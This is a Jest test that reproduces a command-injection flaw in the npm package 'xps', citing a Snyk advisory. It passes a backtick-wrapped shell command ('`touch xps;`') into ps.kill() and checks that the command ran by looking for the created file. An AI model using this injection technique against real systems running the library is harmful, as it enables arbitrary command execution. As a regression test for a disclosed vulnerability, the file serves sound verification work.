//https://snyk.io/vuln/SNYK-JS-XPS-590098
test("Command Injection in xps", () => {
  const ps = require("xps");
  const fs = require("fs");
  const path = "./xps";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  ps.kill("`touch xps;`").fork();
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
